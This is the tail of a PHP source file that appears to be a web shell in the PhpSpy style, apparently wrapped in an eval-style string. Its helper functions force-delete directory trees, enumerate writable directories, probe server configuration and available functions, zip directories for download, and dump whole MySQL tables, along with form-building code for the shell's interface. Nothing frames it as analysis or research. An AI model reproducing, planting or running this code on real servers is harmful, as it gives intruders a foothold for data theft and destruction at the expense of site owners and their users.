	return '';
}

// Delete dir
function deltree($deldir) {
	$mydir=@dir($deldir);
	while($file=$mydir->read())	{
		if((is_dir($deldir.'/'.$file)) && ($file!='.') && ($file!='..')) {
			@chmod($deldir.'/'.$file,0777);
			deltree($deldir.'/'.$file);
		}
		if (is_file($deldir.'/'.$file)) {
			@chmod($deldir.'/'.$file,0777);
			@unlink($deldir.'/'.$file);
		}
	}
	$mydir->close();
	@chmod($deldir,0777);
	return @rmdir($deldir) ? 1 : 0;
}

// Background
function bg() {
	global $bgc;
	return ($bgc++%2==0) ? 'alt1' : 'alt2';
}

// Get path
function getPath($scriptpath, $nowpath) {
	if ($nowpath == '.') {
		$nowpath = $scriptpath;
	}
	$nowpath = str_replace('\\', '/', $nowpath);
	$nowpath = str_replace('//', '/', $nowpath);
	if (substr($nowpath, -1) != '/') {
		$nowpath = $nowpath.'/';
	}
	return $nowpath;
}

// Get up path
function getUpPath($nowpath) {
	$pathdb = explode('/', $nowpath);
	$num = count($pathdb);
	if ($num > 2) {
		unset($pathdb[$num-1],$pathdb[$num-2]);
	}
	$uppath = implode('/', $pathdb).'/';
	$uppath = str_replace('//', '/', $uppath);
	return $uppath;
}

// Config
function getcfg($varname) {
	$result = get_cfg_var($varname);
	if ($result == 0) {
		return 'No';
	} elseif ($result == 1) {
		return 'Yes';
	} else {
		return $result;
	}
}

// Function name
function getfun($funName) {
	return (false !== function_exists($funName)) ? 'Yes' : 'No';
}

function GetList($dir){
	global $dirdata,$j,$nowpath;
	!$j && $j=1;
	if ($dh = opendir($dir)) {
		while ($file = readdir($dh)) {
			$f=str_replace('//','/',$dir.'/'.$file);
			if($file!='.' && $file!='..' && is_dir($f)){
				if (is_writable($f)) {
					$dirdata[$j]['filename']=str_replace($nowpath,'',$f);
					$dirdata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
					$dirdata[$j]['dirchmod']=getChmod($f);
					$dirdata[$j]['dirperm']=getPerms($f);
					$dirdata[$j]['dirlink']=ue($dir);
					$dirdata[$j]['server_link']=$f;
					$dirdata[$j]['client_link']=ue($f);
					$j++;
				}
				GetList($f);
			}
		}
		closedir($dh);
		clearstatcache();
		return $dirdata;
	} else {
		return array();
	}
}

function qy($sql) {
	//echo $sql.'<br>';
	$res = $error = '';
	if(!$res = @mysql_query($sql)) {
		return 0;
	} else if(is_resource($res)) {
		return 1;
	} else {
		return 2;
	}
	return 0;
}

function q($sql) {
	return @mysql_query($sql);
}

function fr($qy){
	mysql_free_result($qy);
}

function sizecount($size) {
	if($size > 1073741824) {
		$size = round($size / 1073741824 * 100) / 100 . ' G';
	} elseif($size > 1048576) {
		$size = round($size / 1048576 * 100) / 100 . ' M';
	} elseif($size > 1024) {
		$size = round($size / 1024 * 100) / 100 . ' K';
	} else {
		$size = $size . ' B';
	}
	return $size;
}

// Zip
class PHPZip{
	var $out='';
	function PHPZip($dir)	{
		if (@function_exists('gzcompress'))	{
			$curdir = getcwd();
			if (is_array($dir)) $filelist = $dir;
			else{
				$filelist=$this -> GetFileList($dir);//File list
				foreach($filelist as $k=>$v) $filelist[]=substr($v,strlen($dir)+1);
			}
			if ((!empty($dir))&&(!is_array($dir))&&(file_exists($dir))) chdir($dir);
			else chdir($curdir);
			if (count($filelist)>0){
				foreach($filelist as $filename){
					if (is_file($filename)){
						$fd = fopen ($filename, 'r');
						$content = @fread ($fd, filesize($filename));
						fclose ($fd);
						if (is_array($dir)) $filename = basename($filename);
						$this -> addFile($content, $filename);
					}
				}
				$this->out = $this -> file();
				chdir($curdir);
			}
			return 1;
		}
		else return 0;
	}

	// Show file list
	function GetFileList($dir){
		static $a;
		if (is_dir($dir)) {
			if ($dh = opendir($dir)) {
				while ($file = readdir($dh)) {
					if($file!='.' && $file!='..'){
						$f=$dir .'/'. $file;
						if(is_dir($f)) $this->GetFileList($f);
						$a[]=$f;
					}
				}
				closedir($dh);
			}
		}
		return $a;
	}

	var $datasec      = array();
	var $ctrl_dir     = array();
	var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
	var $old_offset   = 0;

	function unix2DosTime($unixtime = 0) {
		$timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
		if ($timearray['year'] < 1980) {
			$timearray['year']    = 1980;
			$timearray['mon']     = 1;
			$timearray['mday']    = 1;
			$timearray['hours']   = 0;
			$timearray['minutes'] = 0;
			$timearray['seconds'] = 0;
		} // end if
		return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
				($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
	}

	function addFile($data, $name, $time = 0) {
		$name = str_replace('\\', '/', $name);

		$dtime = dechex($this->unix2DosTime($time));
		$hexdtime	= '\x' . $dtime[6] . $dtime[7]
					. '\x' . $dtime[4] . $dtime[5]
					. '\x' . $dtime[2] . $dtime[3]
					. '\x' . $dtime[0] . $dtime[1];
		eval('$hexdtime = "' . $hexdtime . '";');
		$fr	= "\x50\x4b\x03\x04";
		$fr	.= "\x14\x00";
		$fr	.= "\x00\x00";
		$fr	.= "\x08\x00";
		$fr	.= $hexdtime;

		$unc_len = strlen($data);
		$crc = crc32($data);
		$zdata = gzcompress($data);
		$c_len = strlen($zdata);
		$zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
		$fr .= pack('V', $crc);
		$fr .= pack('V', $c_len);
		$fr .= pack('V', $unc_len);
		$fr .= pack('v', strlen($name));
		$fr .= pack('v', 0);
		$fr .= $name;
		$fr .= $zdata;
		$fr .= pack('V', $crc);
		$fr .= pack('V', $c_len);
		$fr .= pack('V', $unc_len);

		$this -> datasec[] = $fr;
		$new_offset = strlen(implode('', $this->datasec));

		$cdrec = "\x50\x4b\x01\x02";
		$cdrec .= "\x00\x00";
		$cdrec .= "\x14\x00";
		$cdrec .= "\x00\x00";
		$cdrec .= "\x08\x00";
		$cdrec .= $hexdtime;
		$cdrec .= pack('V', $crc);
		$cdrec .= pack('V', $c_len);
		$cdrec .= pack('V', $unc_len);
		$cdrec .= pack('v', strlen($name) );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('v', 0 );
		$cdrec .= pack('V', 32 );
		$cdrec .= pack('V', $this -> old_offset );
		$this -> old_offset = $new_offset;
		$cdrec .= $name;

		$this -> ctrl_dir[] = $cdrec;
	}

	function file() {
		$data    = implode('', $this -> datasec);
		$ctrldir = implode('', $this -> ctrl_dir);
		return $data . $ctrldir . $this -> eof_ctrl_dir . pack('v', sizeof($this -> ctrl_dir)) . pack('v', sizeof($this -> ctrl_dir)) .	pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "\x00\x00";
	}
}

// Dump mysql
function sqldumptable($table, $fp=0) {
	$tabledump = "DROP TABLE IF EXISTS $table;\n";
	$tabledump .= "CREATE TABLE $table (\n";

	$firstfield=1;

	$fields = q("SHOW FIELDS FROM $table");
	while ($field = mysql_fetch_array($fields)) {
		if (!$firstfield) {
			$tabledump .= ",\n";
		} else {
			$firstfield=0;
		}
		$tabledump .= "   $field[Field] $field[Type]";
		if (!empty($field["Default"])) {
			$tabledump .= " DEFAULT '$field[Default]'";
		}
		if ($field['Null'] != "YES") {
			$tabledump .= " NOT NULL";
		}
		if ($field['Extra'] != "") {
			$tabledump .= " $field[Extra]";
		}
	}
	fr($fields);

	$keys = q("SHOW KEYS FROM $table");
	while ($key = mysql_fetch_array($keys)) {
		$kname=$key['Key_name'];
		if ($kname != "PRIMARY" && $key['Non_unique'] == 0) {
			$kname="UNIQUE|$kname";
		}
		if(!is_array($index[$kname])) {
			$index[$kname] = array();
		}
		$index[$kname][] = $key['Column_name'];
	}
	fr($keys);

	while(list($kname, $columns) = @each($index)) {
		$tabledump .= ",\n";
		$colnames=implode($columns,",");

		if ($kname == "PRIMARY") {
			$tabledump .= "   PRIMARY KEY ($colnames)";
		} else {
			if (substr($kname,0,6) == "UNIQUE") {
				$kname=substr($kname,7);
			}
			$tabledump .= "   KEY $kname ($colnames)";
		}
	}

	$tabledump .= "\n);\n\n";
	if ($fp) {
		fwrite($fp,$tabledump);
	} else {
		echo $tabledump;
	}

	$rows = q("SELECT * FROM $table");
	$numfields = mysql_num_fields($rows);
	while ($row = mysql_fetch_array($rows)) {
		$tabledump = "INSERT INTO $table VALUES(";

		$fieldcounter=-1;
		$firstfield=1;
		while (++$fieldcounter<$numfields) {
			if (!$firstfield) {
				$tabledump.=", ";
			} else {
				$firstfield=0;
			}

			if (!isset($row[$fieldcounter])) {
				$tabledump .= "NULL";
			} else {
				$tabledump .= "'".mysql_escape_string($row[$fieldcounter])."'";
			}
		}

		$tabledump .= ");\n";

		if ($fp) {
			fwrite($fp,$tabledump);
		} else {
			echo $tabledump;
		}
	}
	fr($rows);
	if ($fp) {
		fwrite($fp,"\n");
	} else {
		echo "\n";
	}
}

function ue($str){
	return urlencode($str);
}

function p($str){
	echo $str."\n";
}

function tbhead() {
	p('<table width="100%" border="0" cellpadding="4" cellspacing="0">');
}
function tbfoot(){
	p('</table>');
}

function makehide($name,$value=''){
	p("<input id=\"$name\" type=\"hidden\" name=\"$name\" value=\"$value\" />");
}

function makeinput($arg = array()){
	$arg['size'] = $arg['size'] > 0 ? "size=\"$arg[size]\"" : "size=\"100\"";
	$arg['extra'] = $arg['extra'] ? $arg['extra'] : '';
	!$arg['type'] && $arg['type'] = 'text';
	$arg['title'] = $arg['title'] ? $arg['title'].'<br />' : '';
	$arg['class'] = $arg['class'] ? $arg['class'] : 'input';
	if ($arg['newline']) {
		p("<p>$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /></p>");
	} else {
		p("$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] />");
	}
}

function makeselect($arg = array()){
	if ($arg['onchange']) {
		$onchange = 'onchange="'.$arg['onchange'].'"';
	}
	$arg['title'] = $arg['title'] ? $arg['title'] : '';
	if ($arg['newline']) p('<p>');
	p("$arg[title] <select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\" $onchange>");
		if (is_array($arg['option'])) {
			foreach ($arg['option'] as $key=>$value) {
				if ($arg['selected']==$key) {
					p("<option value=\"$key\" selected>$value</option>");
				} else {
					p("<option value=\"$key\">$value</option>");
				}
			}
		}
	p("</select>");
	if ($arg['newline']) p('</p>');
}
function formhead($arg = array()) {
	!$arg['method'] && $arg['method'] = 'post';
	!$arg['action'] && $arg['action'] = $self;
	$arg['target'] = $arg['target'] ? "target=\"$arg[target]\"" : '';
	!$arg['name'] && $arg['name'] = 'form1';
	p("<form name=\"$arg[name]\" id=\"$arg[name]\" action=\"$arg[action]\" method=\"$arg[method]\" $arg[target]>");
	if ($arg['title']) {
		p('<h2>'.$arg['title'].' &raquo;</h2>');
	}
}

function maketext($arg = array()){
	!$arg['cols'] && $arg['cols'] = 100;
	!$arg['rows'] && $arg['rows'] = 25;
	$arg['title'] = $arg['title'] ? $arg['title'].'<br />' : '';
	p("<p>$arg[title]<textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name]\" cols=\"$arg[cols]\" rows=\"$arg[rows]\" $arg[extra]>$arg[value]</textarea></p>");
}

function formfooter($name = ''){
	!$name && $name = 'submit';
	p('<p><input class="bt" name="'.$name.'" id=\"'.$name.'\" type="submit" value="Submit"></p>');
	p('</form>');
}

function formfoot(){
	p('</form>');
}

// Exit
function pr($a) {
	echo '<pre>';
	print_r($a);
	echo '</pre>';
}
?>")); ?>